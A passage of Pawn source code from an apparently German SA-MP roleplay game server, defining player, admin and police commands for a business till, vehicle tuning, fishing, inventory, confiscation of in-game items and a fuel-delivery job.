        if(sscanf(params,"s[100]f",string,betrag)) return SendClientMessage(playerid,COLOR_RED,"Benutze: /kasse Auszahlen [Betrag]");
		if(betrag > BizInfo[id][bkasse]) return SendClientMessage(playerid,COLOR_RED,"So viel Geld ist nicht in der Geschäftskasse!");
		if(betrag < 0.01) return SendClientMessage(playerid,COLOR_RED,"Du kannst nicht weniger als 0.01$ auszahlen!");
		GebeGeld(playerid,betrag);
		BizInfo[id][bkasse] -= betrag-0.01;
		format(string,sizeof string,"Du hast %.2f$ aus der Geschäftskasse entnommen.",betrag+0.001);
		SendClientMessage(playerid,COLOR_GREEN,string);
	}
    else if(strcmp(string,"Betrag",true) == 0)
	{
        format(string,sizeof string,"Du hast %.2f$ in der Geschäftskasse.",BizInfo[id][bkasse]+0.001);
		SendClientMessage(playerid,COLOR_GREEN,string);
    }
    else return SendClientMessage(playerid,COLOR_RED,"Benutze /kasse [Einzahlen/Auszahlen/Betrag]");
    return 1;
}
cmd:time(playerid,params[])
{
	printf("%s time",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 3) return KeineRechte(playerid);
    new time;
    if(sscanf(params,"i", time)) return SendClientMessage(playerid,COLOR_RED,"Benutze /time [0-23]");
    SetPlayerTime(playerid,time,0);
    return 1;
}
cmd:create(playerid,params[])
{
    printf("%s create",PlayerName(playerid));
	if(SpielerInfo[playerid][uAdmin] < 4) return KeineRechte(playerid);
	new id,Float:X,Float:Y,Float:Z;
	if(sscanf(params,"d",id)) return SendClientMessage(playerid,COLOR_RED,"Benute /create [ObjectID]");
	GetPlayerPos(playerid,X,Y,Z);
	AdminObjecte[aobjanzahl] = CreateDynamicObject(id,X,Y,Z,0.00,0.00,0.00);
	printf("Object: %d, X: %.2f, Y: %.2f, Z: %.2f",AdminObjecte[aobjanzahl],X,Y,Z);
	aobjanzahl++;
	return 1;
}
cmd:moebel(playerid,params[])
{
    printf("%s moebel",PlayerName(playerid));
	if(SpielerInfo[playerid][uHausschluessel] == -1) return SendClientMessage(playerid,COLOR_RED,"Du kannst Möbel nur platzieren wenn du ein Haus besitzt!");
    if(!IsPlayerInDynamicArea(playerid,HausInfo[SpielerInfo[playerid][uHausschluessel]][hArea])) return SendClientMessage(playerid,COLOR_RED,"Du befindest dich nicht auf deinem Grundstück!");
    if(HausInfo[SpielerInfo[playerid][uHausschluessel]][hBesitzer] != SpielerInfo[playerid][uID]) return SendClientMessage(playerid,COLOR_RED,"Du besitzt kein eigenes Haus!");
	InventarValue[playerid] = 9;
    GetPlayerPos(playerid,SpielerInfo[playerid][uPosX],SpielerInfo[playerid][uPosY],SpielerInfo[playerid][uPosZ]);
	Teleport(playerid, 3808.5918, -102.5841, 90.7239);
	SetPlayerCameraPos(playerid, 3808.5918, -122.5841, 100.7239);
	SetPlayerCameraLookAt(playerid, 3808.6016, -123.5776, 100.5929);
	SetPlayerVirtualWorld(playerid, 10);
	Freeze(playerid);
	for(new x = 0; x < sizeof(MoebelInv); x++)
	{
		TextDrawShowForPlayer(playerid,MoebelInv[x]);
	}
	SelectTextDraw(playerid, COLOR_GREEN);
	for(new x = 9; x != 0; x--)
	{
		if(Inventar[playerid][InventarValue[playerid]-x] < 1) continue;
		ObjectShow[playerid][9-x] = CreateDynamicObject(Inventar[playerid][InventarValue[playerid]-x], MoebelInvView[9-x][0],MoebelInvView[9-x][1],MoebelInvView[9-x][2],0,0,180,-1,-1,playerid);
	}
	return 1;
}
cmd:tuning(playerid,params[])
{
    if(IsPlayerInRangeOfPoint(playerid,5,1713.1389,-9318.3789,4.4370) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER || IsPlayerInRangeOfPoint(playerid,5,6428.7695,-7830.9756,4.3785) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
    {
		new vehicle = GetPlayerVehicleID(playerid);
		if(vehicle == SAuto[playerid][0][sID])
		{
		    welcherslot[playerid] = 0;
		    mussspeichern[playerid] = 1;
		}
		else if(vehicle == SAuto[playerid][1][sID])
		{
		    welcherslot[playerid] = 1;
		    mussspeichern[playerid] = 1;
		}
		else
		{
	 		welcherslot[playerid] = -1;
		    mussspeichern[playerid] = 0;
		}
		if(GetVehicleModel(vehicle) == 560 || GetVehicleModel(vehicle) == 562 || GetVehicleModel(vehicle) == 565 || GetVehicleModel(vehicle) == 561 || GetVehicleModel(vehicle) == 559 || GetVehicleModel(vehicle) == 558)
		{
			ShowPlayerDialog(playerid,DIALOG_TUNING1,DIALOG_STYLE_LIST,"Tuning","Sidekirt\nAuspuff\nSpoiler\nDach\nVordere Stoßstange\nHintere Stoßstange\nPaintjob","Auswählen","Zurück");
		}
		else if(GetVehicleModel(vehicle) == 575 || GetVehicleModel(vehicle) == 567 || GetVehicleModel(vehicle) == 536 || GetVehicleModel(vehicle) == 535 || GetVehicleModel(vehicle) == 576)
		{
		    ShowPlayerDialog(playerid,DIALOG_TUNING9,DIALOG_STYLE_LIST,"Tuning","Sidekirt\nAuspuff\nDach\nVordere Stoßstange\nHintere Stoßstange\nPaintjob","Auswählen","Zurück");
		}
	}else{SendClientMessage(playerid,COLOR_RED,"Du bist in keiner Werkstatt!");}
	return 1;
}


stock ZeigeTuning(playerid)
{
	ShowPlayerDialog(playerid,DIALOG_TUNING1,DIALOG_STYLE_LIST,"Tuning","Sidekirt\nAuspuff\nSpoiler\nDach\nVordere Stoßstange\nHintere Stoßstange\nPaintjob","Auswählen","Zurück");
	return 1;
}
stock ZeigeTuningan(playerid)
{
	ShowPlayerDialog(playerid,DIALOG_TUNING9,DIALOG_STYLE_LIST,"Tuning","Sidekirt\nAuspuff\nDach\nVordere Stoßstange\nHintere Stoßstange\nPaintjob","Auswählen","Zurück");
	return 1;
}
cmd:addtune(playerid,params[])
{
	new tune;
    if(sscanf(params,"i",tune)) return SendClientMessage(playerid,COLOR_RED,"Benutze /tune [Tuning ID]");
    AddVehicleComponent(GetPlayerVehicleID(playerid),tune);
	return 1;
}
cmd:edit(playerid,params[])
{
	printf("%s edit",PlayerName(playerid));
	Editing(playerid);
	return 1;
}
cmd:video(playerid,params[])
{
    printf("%s video",PlayerName(playerid));
	new status[3];
	if(sscanf(params,"s[3]",status)) return SendClientMessage(playerid,COLOR_RED,"Benutze /video [An/Aus]");
	if(strcmp(status,"An",true) == 0)
	{
	    TextDrawHideForPlayer(playerid, Hunger_box);
		TextDrawHideForPlayer(playerid, Hunger_box2);
		PlayerTextDrawHide(playerid,Hungeranzeige[playerid]);
		Video[playerid] = 1;
		if(!IsPlayerInAnyVehicle(playerid))
		{
		}
		else
		{
		    /*for(new x = 0; x < sizeof(Tacho); x++)
			{
				PlayerTextDrawHide(playerid,Tacho[playerid][x]);
			}*/
		}
	}
	else
	{
	    TextDrawShowForPlayer(playerid, Hunger_box);
		TextDrawShowForPlayer(playerid, Hunger_box2);
		PlayerTextDrawShow(playerid,Hungeranzeige[playerid]);
		Video[playerid] = 0;
		if(!IsPlayerInAnyVehicle(playerid))
		{
		}
		else
		{
		    /*for(new x = 0; x < sizeof(Tacho); x++)
			{
				PlayerTextDrawShow(playerid,Tacho[playerid][x]);
			}*/
		}
	}
	return 1;
}

cmd:wegwerfen(playerid,params[])
{
    new Float:xx,Float:yy,Float:zz,string[80];
	GetPlayerPos(playerid,xx,yy,zz);
	if(zz < 1)
	{
		SendClientMessage(playerid,COLOR_GREEN,"Du hast deine Illegalen Fische zurück ins Wasser geworfen!");
		format(string, sizeof(string), "%s wirft seine Illegalen Fische zurück ins Wasser", PlayerName(playerid));
		SendRadiusMessage(playerid,20.0,string,COLOR_PURPLE);
		for(new x = 0; x < sizeof(SpielerInventar[]); x++)
		{
	    	if(SpielerInventar[playerid][x][0] == 26)
	    	{
				new mm = x;
				SpielerInventar[playerid][mm][0] = -1;
				SpielerInventar[playerid][mm][1] = 0;
	        	PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
				PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
			}
			if(SpielerInventar[playerid][x][0] == 27)
	    	{
				new mm = x;
				SpielerInventar[playerid][mm][0] = -1;
				SpielerInventar[playerid][mm][1] = 0;
	        	PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
				PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
			}
			if(SpielerInventar[playerid][x][0] == 28)
	    	{
				new mm = x;
				SpielerInventar[playerid][mm][0] = -1;
				SpielerInventar[playerid][mm][1] = 0;
	        	PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
				PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
			}
		}
	}else{SendClientMessage(playerid,COLOR_RED,"Fische gehören ins Wasser, nicht an Land!");}
	return 1;
}
cmd:abnehmen(playerid,params[])
{
    printf("%s abnehmen",PlayerName(playerid));
	new pID,str[80],typ[10];
    if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
	if(sscanf(params,"rs[20]",pID,typ)) return SendClientMessage(playerid,COLOR_RED,"Benutze /abnehmen [Name/ID][Drogen/Bomben/Fische/Waffen/Waffenschein/Fuhrerschein/Motorradschein]");
	if(EntfernungZwischenSpielern(playerid,pID) > 2) return SendClientMessage(playerid,COLOR_RED,"Der Spieler ist zu weit entfernt!");
	if(strcmp(typ,"drogen",true) == 0)
	{
		format(str,sizeof(str),"Du hast %s seine Drogen abgenommen",PlayerName(pID));
		SendClientMessage(playerid,COLOR_GREEN,str);
		format(str,sizeof(str),"Officer %s hat dir deine Drogen abgenommen",PlayerName(playerid));
		SendClientMessage(pID,COLOR_GREEN,str);
		for(new x = 0; x < sizeof(SpielerInventar[]); x++)
		{
	    	if(SpielerInventar[pID][x][0] == 14)
	    	{
				new mm2 = x;
				SpielerInventar[pID][mm2][0] = -1;
    			SpielerInventar[pID][mm2][1] = 0;
       			PlayerTextDrawHide(pID,SpielerInventarText[pID][x+7]);
				PlayerTextDrawSetString(pID,SpielerInventarText[pID][x+22],"0");
			}
			if(SpielerInventar[pID][x][0] == 15)
	    	{
				new mm2 = x;
				SpielerInventar[pID][mm2][0] = -1;
    			SpielerInventar[pID][mm2][1] = 0;
       			PlayerTextDrawHide(pID,SpielerInventarText[pID][x+7]);
				PlayerTextDrawSetString(pID,SpielerInventarText[pID][x+22],"0");
			}
			if(SpielerInventar[pID][x][0] == 17)
	    	{
				new mm2 = x;
				SpielerInventar[pID][mm2][0] = -1;
    			SpielerInventar[pID][mm2][1] = 0;
       			PlayerTextDrawHide(pID,SpielerInventarText[pID][x+7]);
				PlayerTextDrawSetString(pID,SpielerInventarText[pID][x+22],"0");
			}
		}
	}
	else if(strcmp(typ,"motorradschein",true) == 0)
	{
	    format(str,sizeof(str),"Du hast %s den Motorradschein abgenommen",PlayerName(pID));
		SendClientMessage(playerid,COLOR_GREEN,str);
		format(str,sizeof(str),"Officer %s hat dir deinen Motorradschein abgenommen",PlayerName(playerid));
		SendClientMessage(pID,COLOR_GREEN,str);
		SpielerInfo[pID][uMotorradschein] = 0;
	}
	else if(strcmp(typ,"fuhrerschein",true) == 0)
	{
	    format(str,sizeof(str),"Du hast %s den Führerschein abgenommen",PlayerName(pID));
		SendClientMessage(playerid,COLOR_GREEN,str);
		format(str,sizeof(str),"Officer %s hat dir deinen Führerschein abgenommen",PlayerName(playerid));
		SendClientMessage(pID,COLOR_GREEN,str);
		SpielerInfo[pID][uFuehrerschein] = 0;
	}
	else if(strcmp(typ,"bomben",true) == 0)
	{
	    format(str,sizeof(str),"Du hast %s die Bomben abgenommen",PlayerName(pID));
		SendClientMessage(playerid,COLOR_GREEN,str);
		format(str,sizeof(str),"Officer %s hat dir die Bomben abgenommen",PlayerName(playerid));
		SendClientMessage(pID,COLOR_GREEN,str);
	    for(new x = 0; x < sizeof(SpielerInventar[]); x++)
		{
		    if(SpielerInventar[pID][x][0] == 29)
	    	{
				new mm2 = x;
				SpielerInventar[pID][mm2][0] = -1;
    			SpielerInventar[pID][mm2][1] = 0;
       			PlayerTextDrawHide(pID,SpielerInventarText[pID][x+7]);
				PlayerTextDrawSetString(pID,SpielerInventarText[pID][x+22],"0");
			}
		}
	}
	else if(strcmp(typ,"fische",true) == 0)
	{
		format(str,sizeof(str),"Du hast %s seine Fische abgenommen",PlayerName(pID));
		SendClientMessage(playerid,COLOR_GREEN,str);
		format(str,sizeof(str),"Officer %s hat dir deine Fische abgenommen",PlayerName(playerid));
		SendClientMessage(pID,COLOR_GREEN,str);
		for(new x = 0; x < sizeof(SpielerInventar[]); x++)
		{
	    	if(SpielerInventar[pID][x][0] == 26)
	    	{
				new mm = x;
				SpielerInventar[pID][mm][0] = -1;
    			SpielerInventar[pID][mm][1] = 0;
	        	PlayerTextDrawHide(pID,SpielerInventarText[pID][x+7]);
				PlayerTextDrawSetString(pID,SpielerInventarText[pID][x+22],"0");
			}
  			if(SpielerInventar[pID][x][0] == 27)
	    	{
				new mm = x;
				SpielerInventar[pID][mm][0] = -1;
    			SpielerInventar[pID][mm][1] = 0;
	        	PlayerTextDrawHide(pID,SpielerInventarText[pID][x+7]);
				PlayerTextDrawSetString(pID,SpielerInventarText[pID][x+22],"0");
			}
  			if(SpielerInventar[pID][x][0] == 28)
	    	{
				new mm = x;
				SpielerInventar[pID][mm][0] = -1;
    			SpielerInventar[pID][mm][1] = 0;
	        	PlayerTextDrawHide(pID,SpielerInventarText[pID][x+7]);
				PlayerTextDrawSetString(pID,SpielerInventarText[pID][x+22],"0");
			}
		}
	}
	else if(strcmp(typ,"waffen",true) == 0)
	{
		format(str,sizeof(str),"Du hast %s seine Waffen abgenommen",PlayerName(pID));
		SendClientMessage(playerid,COLOR_GREEN,str);
		format(str,sizeof(str),"Officer %s hat dir deine Waffen abgenommen",PlayerName(playerid));
		SendClientMessage(pID,COLOR_GREEN,str);
		ResetWeapons(pID);
	}
	else if(strcmp(typ,"waffenschein",true) == 0)
	{
		format(str,sizeof(str),"Du hast %s seinen Waffenschein abgenommen",PlayerName(pID));
		SendClientMessage(playerid,COLOR_GREEN,str);
		format(str,sizeof(str),"Officer %s hat dir deinen Waffenschein abgenommen",PlayerName(playerid));
		SendClientMessage(pID,COLOR_GREEN,str);
		SpielerInfo[pID][uWaffenschein] = 0;
	}
	else{SendClientMessage(playerid,COLOR_RED,"Benutze /abnehmen [Name/ID][Drogen/Bomben/Fische/Waffen/Waffenschein/Fuhrerschein/Motorradschein]");}
	return 1;
}

cmd:checkwaffen(playerid,params[])
{
    new str[50],pID,string[60],Float:xx,Float:yy,Float:zz;
    new Waffen[13][2];
    if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
    if(sscanf(params,"r",pID)) return SendClientMessage(playerid,COLOR_RED,"Benutze /checkwaffen [Name/ID]");
    GetPlayerPos(pID,xx,yy,zz);
    if(!IsPlayerInRangeOfPoint(playerid,5,xx,yy,zz)) return SendClientMessage(playerid,COLOR_RED,"Du bist nicht in der Nähe des Spielers!");
	format(string,sizeof (string),"Waffen von %s",PlayerName(pID));
	SendClientMessage(playerid,COLOR_GREEN,string);
	format(string,sizeof (string),"%s durchsucht deine Waffen...",PlayerName(playerid));
	SendClientMessage(pID,COLOR_GREEN,string);
	new waffencheck = 0;
    for (new i = 0; i < 13; i++)
	{
	    GetPlayerWeaponData(pID, i, Waffen[i][0], Waffen[i][1]);
		if(Waffen[i][0] > 0)
		{
		    format(str,sizeof(str),"Waffenname: %s Munition %d",WaffenName[Waffen[i][0]],Waffen[i][1]);
		    SendClientMessage(playerid,COLOR_GREEN,str);
		    waffencheck++;
		}
	}
	if(waffencheck == 0)
	{
	    SendClientMessage(playerid,COLOR_RED,"Der Spieler hat keine Waffen bei sich!");
	}
	return 1;
}
cmd:durchsuchen(playerid,params[])
{
    printf("%s durchsuchen",PlayerName(playerid));
	new pID,str1[40],str[256],naame[MAX_PLAYER_NAME],samenss = 0,drogenss = 0,kokss = 0,krote=0,dalf = 0,Hoi = 0,bombe = 0;
    if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
	if(sscanf(params,"r",pID)) return SendClientMessage(playerid,COLOR_RED,"Benutze /durchsuchen [Name/ID]");
	if(EntfernungZwischenSpielern(playerid,pID) > 2) return SendClientMessage(playerid,COLOR_RED,"Der Spieler ist zu weit entfernt!");
	GetPlayerName(pID,naame,sizeof(naame));
	format(str1,sizeof(str1),"%s besitzt:",PlayerName(pID));
	SendClientMessage(playerid,COLOR_GREEN,str1);
	for(new x = 0; x < sizeof(SpielerInventar[]); x++)
	{
	    if(SpielerInventar[pID][x][0] == 14)
	    {
	        samenss++;
	    	format(str1,sizeof(str1),"- %d Samen",SpielerInventar[pID][x][1]);
			SendClientMessage(playerid,COLOR_GREEN,str1);
	    	//samen
	    }
	    else if(SpielerInventar[pID][x][0] == 15)
	    {
	        drogenss++;
	    	format(str1,sizeof(str1),"- %dg Drogen",SpielerInventar[pID][x][1]);
			SendClientMessage(playerid,COLOR_GREEN,str1);
	    	//drogen
	    }
	    else if(SpielerInventar[pID][x][0] == 17)
	    {
	        kokss++;
	    	format(str1,sizeof(str1),"- %dg Koks",SpielerInventar[pID][x][1]);
			SendClientMessage(playerid,COLOR_GREEN,str1);
	    	//koks
	    }
	    else if(SpielerInventar[pID][x][0] == 26)
	    {
	        krote++;
	    	format(str1,sizeof(str1),"- %d Schildkröten",SpielerInventar[pID][x][1]);
			SendClientMessage(playerid,COLOR_GREEN,str1);
	    	//schildkröte
	    }
	    else if(SpielerInventar[pID][x][0] == 28)
	    {
	        Hoi++;
	    	format(str1,sizeof(str1),"- %d Haie",SpielerInventar[pID][x][1]);
			SendClientMessage(playerid,COLOR_GREEN,str1);
	    	//hai
	    }
	    else if(SpielerInventar[pID][x][0] == 29)
	    {
	        bombe++;
	    	format(str1,sizeof(str1),"- %d Bomben",SpielerInventar[pID][x][1]);
			SendClientMessage(playerid,COLOR_GREEN,str1);
	    	//hai
	    }
	    else if(SpielerInventar[pID][x][0] == 27)
	    {
	        dalf++;
	    	format(str1,sizeof(str1),"- %d Delfine",SpielerInventar[pID][x][1]);
			SendClientMessage(playerid,COLOR_GREEN,str1);
	    	//delfin
		}
   	}
   	if(samenss == 0)
   	{
		SendClientMessage(playerid,COLOR_GREEN,"- Keine Samen");
   	}
   	if(drogenss == 0)
   	{
		SendClientMessage(playerid,COLOR_GREEN,"- Kein Gras");
   	}
   	if(kokss == 0)
   	{
		SendClientMessage(playerid,COLOR_GREEN,"- Kein Koks");
   	}
   	if(krote == 0)
   	{
		SendClientMessage(playerid,COLOR_GREEN,"- Keine Schildkröten");
   	}
   	if(Hoi == 0)
   	{
		SendClientMessage(playerid,COLOR_GREEN,"- Keine Haie");
   	}
   	if(dalf == 0)
   	{
		SendClientMessage(playerid,COLOR_GREEN,"- Keine Delfine");
   	}
   	if(bombe == 0)
   	{
		SendClientMessage(playerid,COLOR_GREEN,"- Keine Bomben");
   	}
   	format(str, sizeof(str), "%s durchsucht %s nach illegalen Waren/Gegenständen!", PlayerName(playerid),PlayerName(pID));
	SendRadiusMessage(playerid,20.0,str,COLOR_PURPLE);
	return 1;
}
cmd:knastzeit(playerid,params[])
{
	new str[100];
    if(SpielerInfo[playerid][uKnastZeit] != 0)
    {
        format(str,sizeof(str),"Du bist noch %d Minuten im Gefängnis!",SpielerInfo[playerid][uKnastZeit]/60);
        SendClientMessage(playerid,COLOR_GREEN,str);
    }else{SendClientMessage(playerid,COLOR_RED,"Du bist nicht im Gefängnis!");}
	return 1;
}
cmd:inventar(playerid,params[])//7-21
{
 	printf("%s inventar",PlayerName(playerid));
	if(SpielerInfo[playerid][uKnastZeit] == 0)
	{
		new string[100];
		if(InventarShow[playerid] == 0)
		{
		    Inventardraws(playerid);
		    InventarShow[playerid] = 1;
		    for(new x = 0; x < sizeof(SpielerInventar[]); x++)
			{
			    if(SpielerInventar[playerid][x][0] != -1 && SpielerInventar[playerid][x][1] != 0)
			    {
	     			PlayerTextDrawFont(playerid, SpielerInventarText[playerid][x+7], TEXT_DRAW_FONT_MODEL_PREVIEW);
					PlayerTextDrawSetPreviewModel(playerid,SpielerInventarText[playerid][x+7], InventarValues[SpielerInventar[playerid][x][0]][iID]);
					if(InventarValues[SpielerInventar[playerid][x][0]][iID] != 19346 && InventarValues[SpielerInventar[playerid][x][0]][iID] != 902 && InventarValues[SpielerInventar[playerid][x][0]][iID] != 19346) PlayerTextDrawSetPreviewRot(playerid,SpielerInventarText[playerid][x+7], 0.0, 0.0, 0.0, InventarValues[SpielerInventar[playerid][x][0]][iZoom]);
     				else PlayerTextDrawSetPreviewRot(playerid,SpielerInventarText[playerid][x+7], 0.0, 0.0, 90.0, InventarValues[SpielerInventar[playerid][x][0]][iZoom]);
					PlayerTextDrawSetSelectable(playerid, SpielerInventarText[playerid][x+7], 1);
					format(string,sizeof string,"%d",SpielerInventar[playerid][x][1]);
					PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],string);
				}
			}
			for(new x = 0; x < sizeof(SpielerInventarText[]); x++) PlayerTextDrawShow(playerid, SpielerInventarText[playerid][x]);
			SelectTextDraw(playerid,0x00B9FFFF);
		}
		else
		{
		    InventarShow[playerid] = 0; CancelSelectTextDraw(playerid);
			for(new x = 0; x < sizeof(SpielerInventarText[]); x++) PlayerTextDrawHide(playerid, SpielerInventarText[playerid][x]);
			for(new t = 0; t < 38; t++)
			{
			    PlayerTextDrawDestroy(playerid, SpielerInventarText[playerid][t]);
			}
		}
	}else{SendClientMessage(playerid,COLOR_RED,"Im Gefängnis ist dieser Befehl nicht möglich!");}
	return 1;
}
cmd:angel(playerid,params[])
{
    if(IsPlayerAttachedObjectSlotUsed(playerid,9))
 	{
  		RemovePlayerAttachedObject(playerid,9);
  		SendClientMessage(playerid,COLOR_RED,"Angel weggepackt!");
  		if(!Verstauen(playerid,18632,1)) return SendClientMessage(playerid,COLOR_RED,"Du hast bereits eine Angel oder es ist kein Platz mehr im Inventar!");
 	}else{SendClientMessage(playerid,COLOR_RED,"Damit kannst du nur deine Angel entfernen!");}
 	return 1;
}
forward Angeltimer(playerid);
public Angeltimer(playerid)
{
    angelnerlaubt[playerid] = 0;
    SendClientMessage(playerid,COLOR_YELLOW,"Du kannst nun wieder Angeln!");
	return 1;
}
cmd:angeln(playerid,params[])
{
	new string[80];
    printf("%s angeln",PlayerName(playerid));
	if(!IsPlayerAttachedObjectSlotUsed(playerid,9)) return SendClientMessage(playerid,COLOR_RED,"Du hast keine Angel!");
	new Float:xx,Float:yy,Float:zz;
	GetPlayerPos(playerid,xx,yy,zz);
	if(SpielerInfo[playerid][uAngelnerlaubt] == 0)
	{
		new rand = random(150);
		if(zz < 1.5)
		{
		    SpielerInfo[playerid][uAngelnerlaubt2]++;
		    if(angelnerlaubt[playerid] > 50)
		    {
		        Angeltimerxd[playerid] = SetTimerEx("Angeltimer", 1000*60*30, false, "i", playerid);
		    }
		    if(SpielerInfo[playerid][ufAngel] == 0)
	        {
	        	SpielerInfo[playerid][ufAngel] = 1;
	        	Missionenaktu(playerid);
	        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Benutze die Angel {0080FF}(/missionen)");
	        	new Float:belohnung;
            	belohnung = 150;
            	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
				GebeGeld(playerid,belohnung);
			}
		    if(rand == 50)
		    {
		        Verstauen(playerid,1608,1);
		        SendClientMessage(playerid,COLOR_GREEN,"Du hast einen Hai gefangen! Dieser Fisch ist illegal. /wegwerfen um illegale Fische zu entfernen");
		        format(string, sizeof(string), "%s Angelt einen Hai", PlayerName(playerid));
				SendRadiusMessage(playerid,20.0,string,COLOR_PURPLE);
		    }
		    else if(rand == 60)
		    {
		        Verstauen(playerid,1609,1);
		        SendClientMessage(playerid,COLOR_GREEN,"Du hast eine Schildkröte gefangen! Dieses Tier ist illegal. /wegwerfen um illegale Fische zu entfernen");
		        format(string, sizeof(string), "%s Angelt eine Schildkröte", PlayerName(playerid));
				SendRadiusMessage(playerid,20.0,string,COLOR_PURPLE);
		    }
		    else if(rand == 70)
		    {
		        Verstauen(playerid,1607,1);
		        SendClientMessage(playerid,COLOR_GREEN,"Du hast einen Delfin gefangen! Dieses Tier ist illegal. /wegwerfen um illegale Fische zu entfernen");
		        format(string, sizeof(string), "%s Angelt einen Delfin", PlayerName(playerid));
				SendRadiusMessage(playerid,20.0,string,COLOR_PURPLE);
		    }
		    else if(rand > 30 && rand < 38)
		    {
		        Verstauen(playerid,19630,1);
		        SendClientMessage(playerid,COLOR_GREEN,"Du hast einen Hering gefangen!");//10
		        format(string, sizeof(string), "%s Angelt einen Hering", PlayerName(playerid));
				SendRadiusMessage(playerid,20.0,string,COLOR_PURPLE);
		    }
		    else if(rand > 0 && rand < 15)
		    {
		        Verstauen(playerid,902,1);
		        SendClientMessage(playerid,COLOR_GREEN,"Du hast einen Seestern gefangen!");
		        format(string, sizeof(string), "%s Angelt einen Seestern", PlayerName(playerid));
				SendRadiusMessage(playerid,20.0,string,COLOR_PURPLE);
		    }
		    else if(rand > 80 && rand < 91)
		    {
		        Verstauen(playerid,1603,1);
		        SendClientMessage(playerid,COLOR_GREEN,"Du hast eine Qualle gefangen!"); // 5$
		        format(string, sizeof(string), "%s Angelt einen Qualle", PlayerName(playerid));
				SendRadiusMessage(playerid,20.0,string,COLOR_PURPLE);
		    }
	    	else if(rand > 110 && rand < 120)
		    {
		        new Float:geldo = random(3)+1;
		        SendFormatMessage(playerid,COLOR_GREEN,"Du hast %.2f$ geangelt!",geldo); // 5$
		        GebeGeld(playerid,geldo);
		        format(string, sizeof(string), "%s Angelt %.2f$", PlayerName(playerid),geldo);
				SendRadiusMessage(playerid,20.0,string,COLOR_PURPLE);
		    }
			else
			{
				SendClientMessage(playerid,COLOR_RED,"Du hast nichts geangelt!");
	  			format(string, sizeof(string), "%s angelt nichts!", PlayerName(playerid));
				SendRadiusMessage(playerid,20.0,string,COLOR_PURPLE);
			}
		}
		else
		{
		    SendClientMessage(playerid,COLOR_RED,"Du kannst nicht an Land angeln!");
		}
	}
	else
	{
		SendClientMessage(playerid,COLOR_RED,"Du kannst momentan nicht angeln!");
	}
	if(SpielerInfo[playerid][uAngelnerlaubt2] == 30)
	{
	    SpielerInfo[playerid][uAngelnerlaubt2] = 0;
	    SpielerInfo[playerid][uAngelnerlaubt] = 1800;
	}
	return 1;
}
forward AufzugTueren(etage);
public AufzugTueren(etage)
{
    new Float:X,Float:Y,Float:Z;
    GetDynamicObjectPos(Aufzug,X,Y,Z);
	if(etage > 0)
	{
 		MoveDynamicObject(Aufzug,X,Y,20.98+5.46*(etage-1),3.0);
 		MoveDynamicObject(AufzugTuer[0],X,Y,20.98+5.46*(etage-1),3.0);
 		MoveDynamicObject(AufzugTuer[1],X,Y,20.98+5.46*(etage-1),3.0);
	}
	else
	{
 		MoveDynamicObject(Aufzug,X,Y,12.12,3.0);
 		MoveDynamicObject(AufzugTuer[0],X,Y,12.12,3.0);
 		MoveDynamicObject(AufzugTuer[1],X,Y,12.12,3.0);
	}
}
public OnDynamicObjectMoved(objectid)
{
	if(objectid == Aufzug)
	{
	    new Float:X,Float:Y,Float:Z;
	    GetDynamicObjectPos(Aufzug,X,Y,Z);
	    MoveDynamicObject(AufzugTuer[0],X,Y-1.74,Z,1.0);
 		MoveDynamicObject(AufzugTuer[1],X,Y+1.74,Z,1.0);
 		GetDynamicObjectPos(EtagenTuer[EtageChoose][0],X,Y,Z);
 		MoveDynamicObject(EtagenTuer[EtageChoose][0],X,Y-1.74,Z,1.0);
 		MoveDynamicObject(EtagenTuer[EtageChoose][1],X,Y+1.74,Z,1.0);
 		SetTimer("SetAufzugBereit",1700,0);
	}
}
forward tankwart(playerid);
public tankwart(playerid)
{
	ApplyActorAnimation(server_actors[17],"ON_LOOKERS","wave_loop",4.1, 0, 0, 0, 1, 0);
}
forward koordinaten(playerid);
public koordinaten(playerid)
{
	TogglePlayerControllable(playerid,true);
	ClearActorAnimations(server_actors[17]);
	SetCameraBehindPlayer(playerid);
	new tankstelle = random(3);
	if(tankstelle == 0)
	{
	    TruckSpritmodus[playerid] = 33;
	    SetPlayerCheckpoint(playerid,2490.1226,-9312.2168,4.4000-1,10.0);
	    SendClientMessage(playerid,COLOR_GREEN,"Deine Reise geht nach Lake Sorten. Liefere den Sprit an der Tankstelle mit /abfuellen ab!");
	}
	else if(tankstelle == 1)
	{
	    TruckSpritmodus[playerid] = 34;
	    SetPlayerCheckpoint(playerid,5396.8203,-9283.1270,4.4064-1,10.0);
	    SendClientMessage(playerid,COLOR_GREEN,"Deine Reise geht nach Lake Vortex. Liefere den Sprit an der Tankstelle mit /abfuellen ab!");
	}
	else if(tankstelle == 2)
	{
	    TruckSpritmodus[playerid] = 35;
	    SetPlayerCheckpoint(playerid,6302.0615,-7838.3169,4.4113-1,10.0);
	    SendClientMessage(playerid,COLOR_GREEN,"Deine Reise geht nach Santa Felton. Liefere den Sprit an der Tankstelle mit /abfuellen ab!");
	}
}
forward Abpumpentimerdrei(playerid);
public Abpumpentimerdrei(playerid)
{
    new veh = GetPlayerVehicleID(playerid);
